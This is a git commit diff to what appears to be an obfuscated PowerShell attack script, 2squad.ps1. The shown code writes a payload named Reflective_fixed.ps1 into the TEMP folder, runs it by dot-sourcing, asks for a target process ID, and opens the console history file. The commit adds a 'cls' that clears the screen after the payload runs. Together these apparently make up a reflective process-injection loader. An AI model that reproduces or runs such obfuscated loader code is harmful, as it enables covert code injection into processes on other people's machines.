c8fa7474171742e4a83a1f7abe1f7eac10385f05
2squad <nnongvega@gmail.com>
2026-03-31 18:21:33 +0700

    2squad.ps1

--- 2squad.ps1
+++ 2squad.ps1
@@ -40,7 +40,7 @@ $_0xC11 = "$env:TEMP\Reflective_fixed.ps1"
 $_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 
 . $_0xC11
-
+cls
 $_0x2AA = Read-Host (@("Enter"," PID") -join "")
 
 start $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
